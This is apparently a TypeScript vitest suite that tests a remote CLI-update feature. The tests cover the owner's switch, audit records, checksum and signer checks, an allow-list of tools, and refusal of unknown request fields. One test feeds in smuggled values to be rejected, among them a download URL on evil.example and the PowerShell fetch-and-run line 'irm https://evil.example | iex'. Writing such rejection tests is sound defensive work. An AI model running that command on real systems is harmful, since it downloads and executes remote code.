import { createServer, type Server } from "node:http";
import { once } from "node:events";
import { createHash, randomUUID } from "node:crypto";
import { mkdtempSync, readFileSync, readdirSync, rmSync, statSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve, sep } from "node:path";
import { afterEach, describe, expect, it, vi } from "vitest";
import { RuntimeClient, type RuntimeBridge } from "../src/runtime-client.js";
import { RuntimeClientStore } from "../src/runtime-client-store.js";
import { RuntimeCoordinator } from "../src/runtime-coordinator.js";
import { credentialProfilesRoot } from "../src/runtime-credential-profiles.js";
import { AUDIT_FILE, setRemoteSwitch } from "../src/runtime-remote-setup.js";
import { INSTALLABLE_CLIS, MANIFEST_COMMAND, managedCliExecutable, managedInstaller } from "../src/runtime-cli-install.js";
import type { WindowsCliProbe, WindowsCliTask } from "../src/windows-cli.js";

// #3190 Part 3b: the server asks a computer to install a CLI through `callAccount` (an account.request frame that is NOT journaled), and the Runtime's
// own switch, audit and closed table decide. Real coordinator, real Runtime client, real WebSocket; only the installer is a fake.
const directories: string[] = [], clients: RuntimeClient[] = [], hubs: RuntimeCoordinator[] = [], servers: Server[] = [];
const scratch = (): string => { const path = mkdtempSync(join(tmpdir(), "agend-update-153-")); directories.push(path); return path; };
const bridge: RuntimeBridge = { probe: async (): Promise<WindowsCliProbe> => ({ home: "C:\\fixture", clis: [], probedAt: 1 }), prepareWorkspace: async () => "C:\\w", start: () => { throw Error("unused"); },
  get: (): WindowsCliTask | null => null, cancel: () => { throw Error("unused"); }, close: () => {}, releaseUnknown: () => {} };
async function fixture(clientOptions: Partial<ConstructorParameters<typeof RuntimeClient>[0]> = {}, timeout = 5000) {
  const hubHome = scratch(), hub = new RuntimeCoordinator(hubHome, { requestTimeoutMs: timeout }); hubs.push(hub);
  const pairing = hub.createPairing(), pending = hub.pair({ code: pairing.code, name: "Install fixture", platform: "win32" });
  hub.approve(pending.machineId, hub.machine(pending.machineId)?.pairingFingerprint);
  const claim = hub.claim({ machineId: pending.machineId, claimSecret: pending.claimSecret }); if (claim.status !== "approved") throw Error("Pairing fixture failed");
  const server = createServer(); servers.push(server);
  server.on("upgrade", (req, socket, head) => { if (!hub.handleUpgrade(req, socket, head)) socket.destroy(); });
  server.listen(0, "127.0.0.1"); await once(server, "listening"); const address = server.address(); if (!address || typeof address === "string") throw Error("No fixture port");
  const runtimeHome = scratch(), store = new RuntimeClientStore(join(runtimeHome, "state"));
  store.saveCredentials({ server: `http://127.0.0.1:${address.port}`, machineId: claim.machineId, credential: claim.credential, name: "Install fixture" });
  const client = new RuntimeClient({ store, bridge, reconnectMs: 25, pollMs: 10, credentialProfilesRoot: credentialProfilesRoot(store.directory),
    remoteAccounts: { find: async () => null, environment: () => ({}) }, ...clientOptions });
  clients.push(client); await client.start(); await vi.waitFor(() => expect(client.online()).toBe(true));
  await vi.waitFor(() => expect(hub.machine(claim.machineId)?.status).toBe("online"));
  return { hub, hubHome, store, client, machineId: claim.machineId, dir: store.directory };
}
afterEach(async () => {
  vi.restoreAllMocks();
  for (const client of clients.splice(0)) await client.stop();
  for (const hub of hubs.splice(0)) hub.close();
  for (const server of servers.splice(0)) { server.closeAllConnections(); await new Promise<void>(done => server.close(() => done())); }
  for (const path of directories.splice(0)) { if (!resolve(path).startsWith(resolve(tmpdir()) + sep)) throw Error("Unexpected fixture path"); rmSync(path, { recursive: true, force: true }); }
});
const audit = (dir: string): string[] => { try { return readFileSync(join(dir, AUDIT_FILE), "utf8").trim().split("\n").filter(Boolean); } catch { return []; } };
const ACTOR = "admin:0123456789abcdef";
const GOOGLE = "CN=Google LLC, O=Google LLC, L=Mountain View, S=California, C=US";
const sha = (b: Buffer): string => createHash("sha512").update(b).digest("hex");

// AGEND-153: the named exception through the whole stack — real coordinator, real Runtime client and socket, the real installer with a fake PowerShell. The dashboard asks `cli.update` (the CLI id and
// the asker's handle); the Runtime's capability, its owner's switch, its closed table, the manifest, the checksum and the signer decide.
describe("cli.update: Antigravity to the vendor's latest, through the server's account.request", () => {
  const old = Buffer.from("MZ-agy-1.5.3"), fresh = Buffer.from("MZ-agy-1.6.0");
  const URL = "https://storage.googleapis.com/antigravity-public/antigravity-cli/1.6.0-6604829099950080/windows-x64/cli_windows_x64.exe";
  const stack = (options: { content?: Buffer; manifest?: string } = {}) => {
    const reads: string[] = [];
    const root = join(scratch(), "cli");
    const installer = managedInstaller({ root, nodePath: join(root, "no-node.exe"), pins: { antigravity: { ...INSTALLABLE_CLIS.antigravity, bytes: old.length, sha512: sha(old) } },
      run: async (_file, args, { env }) => {
        if (args[args.length - 1] === MANIFEST_COMMAND) { reads.push("manifest"); return { code: 0, stdout: options.manifest ?? JSON.stringify({ version: "1.6.0", url: URL, sha512: sha(fresh) }) }; }
        reads.push("download"); writeFileSync(env.AGEND_DOWNLOAD_FILE!, env.AGEND_DOWNLOAD_URL === URL ? options.content ?? fresh : old); return { code: 0, stdout: "" };
      },
      signerOf: async () => ({ status: "Valid", subject: GOOGLE }) });
    return { reads, root, installer, remoteAccounts: { find: async () => null, environment: () => ({}), installer } };
  };
  it("a Runtime that has the installer claims `cli-update` beside `cli-install`; one without them claims neither", async () => {
    const f = await fixture({ remoteAccounts: stack().remoteAccounts });
    expect(f.hub.machine(f.machineId)?.runtimeInfo?.capabilities).toEqual(expect.arrayContaining(["cli-install", "cli-update"]));
    const bare = await fixture({ credentialProfilesRoot: undefined });
    expect(bare.hub.machine(bare.machineId)?.runtimeInfo?.capabilities).not.toContain("cli-update");
  });
  it("refuses while the computer's owner has not turned the switch on: nothing is read or downloaded, and the refusal is recorded under its own action", async () => {
    const s = stack(), f = await fixture({ remoteAccounts: s.remoteAccounts });
    await expect(f.hub.callAccount(f.machineId, "cli.update", { cli: "antigravity", actor: ACTOR })).rejects.toThrow(/"install" turned off.*agend-runtime remote-setup install on/);
    expect(s.reads).toEqual([]);
    expect(audit(f.dir).map(line => JSON.parse(line)).map(line => `${line.action}|${line.outcome}|${line.reason}`)).toEqual(["cli.update|refused|switch_off"]);
  });
  it("with the switch on: reads the manifest, downloads, verifies, records `cli.update` started/ok, and answers with the version that landed", async () => {
    const s = stack(), f = await fixture({ remoteAccounts: s.remoteAccounts });
    setRemoteSwitch(f.dir, "install", true, 3_600_000);
    expect(await f.hub.callAccount(f.machineId, "cli.update", { cli: "antigravity", actor: ACTOR })).toEqual({ version: "1.6.0" });
    expect(s.reads).toEqual(["manifest", "download"]);
    expect(managedCliExecutable(s.root, "antigravity")).toMatchObject({ version: "1.6.0" });
    expect(audit(f.dir).map(line => JSON.parse(line)).map(line => `${line.action}|${line.outcome}|${line.cli}|${line.actor}`)).toEqual([`cli.update|started|antigravity|${ACTOR}`, `cli.update|ok|antigravity|${ACTOR}`]);
  });
  it("a file that is not the manifest's checksum is refused with the reason and recorded as failed; the old copy stays", async () => {
    const s = stack({ content: Buffer.from("MZ-tampered") }), f = await fixture({ remoteAccounts: s.remoteAccounts });
    setRemoteSwitch(f.dir, "install", true, 3_600_000);
    await expect(f.hub.callAccount(f.machineId, "cli.update", { cli: "antigravity", actor: ACTOR })).rejects.toThrow(/checksum.*nothing was installed/);
    expect(managedCliExecutable(s.root, "antigravity")).toBeNull();
    expect(audit(f.dir).map(line => JSON.parse(line)).map(line => `${line.action}|${line.outcome}`)).toEqual(["cli.update|started", "cli.update|failed"]);
  });
  it("only the exception's CLI: Codex, Claude Code, OpenCode, Grok are refused by the Runtime itself before `started` (they have the pinned install)", async () => {
    const s = stack(), f = await fixture({ remoteAccounts: s.remoteAccounts });
    setRemoteSwitch(f.dir, "install", true, 3_600_000);
    await expect(f.hub.callAccount(f.machineId, "cli.update", { cli: "codex", actor: ACTOR })).rejects.toThrow(/not updated to a latest release from here/);
    await expect(f.hub.callAccount(f.machineId, "cli.update", { cli: "claude-code", actor: ACTOR })).rejects.toThrow(/not updated to a latest release from here/);
    await expect(f.hub.callAccount(f.machineId, "cli.update", { cli: "opencode", actor: ACTOR })).rejects.toThrow(/not updated to a latest release from here/);
    await expect(f.hub.callAccount(f.machineId, "cli.update", { cli: "grok", actor: ACTOR })).rejects.toThrow(/not in this Runtime's install list/);
    expect(s.reads).toEqual([]);
    expect(audit(f.dir).map(line => JSON.parse(line)).every(line => line.outcome === "refused")).toBe(true);
  });
  it("an installer that has no update refuses `cli.update` for everything", async () => {
    const f = await fixture({ remoteAccounts: { find: async () => null, environment: () => ({}), installer: { knows: () => true, install: async () => ({ version: "1.5.3" }) } } });
    setRemoteSwitch(f.dir, "install", true, 3_600_000);
    await expect(f.hub.callAccount(f.machineId, "cli.update", { cli: "antigravity", actor: ACTOR })).rejects.toThrow(/not updated to a latest release from here/);
  });
  it("the request is closed: an address, a version, a hash or a command in it is refused before any frame is written", async () => {
    const s = stack(), f = await fixture({ remoteAccounts: s.remoteAccounts }), send = vi.spyOn(f.hub as unknown as { send(connection: unknown, value: unknown): void }, "send");
    setRemoteSwitch(f.dir, "install", true, 3_600_000);
    for (const extra of [{ url: "https://evil.example/agy.exe" }, { version: "9.9.9" }, { sha512: "0".repeat(128) }, { command: "irm https://evil.example | iex" }, { release: "latest" }]) {
      await expect(f.hub.callAccount(f.machineId, "cli.update", { cli: "antigravity", actor: ACTOR, ...extra } as never), JSON.stringify(extra)).rejects.toThrow(/unknown field/);
    }
    expect(send).not.toHaveBeenCalled(); expect(s.reads).toEqual([]);
  });
  it("a Runtime that does not claim `cli-update` is never sent it: no frame is written", async () => {
    const f = await fixture({ credentialProfilesRoot: undefined }), send = vi.spyOn(f.hub as unknown as { send(connection: unknown, value: unknown): void }, "send");
    await expect(f.hub.callAccount(f.machineId, "cli.update", { cli: "antigravity", actor: ACTOR })).rejects.toThrow(/Update the Runtime/);
    expect(send).not.toHaveBeenCalled();
  });
});
